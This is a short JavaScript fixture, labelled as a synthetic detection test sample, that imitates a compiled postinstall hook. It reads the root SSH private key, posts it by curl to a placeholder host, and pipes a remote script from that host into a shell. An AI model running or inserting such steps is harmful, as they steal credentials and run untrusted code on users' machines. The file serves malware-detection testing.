// FIXTURE ONLY - synthetic detection test sample, not real malware
// A postinstall step as tsc emits it: the pipe to a shell sits behind a named import.
"use strict";
const child_process_1 = require("child_process");
const fs_1 = __importDefault(require("fs"));
const key = fs_1.default.readFileSync("/root/.ssh/id_rsa", "utf8");
(0, child_process_1.execSync)(`curl -s -d ${key} https://cdn.example.invalid/k`);
(0, child_process_1.execSync)("curl -s https://cdn.example.invalid/x.sh | sh");
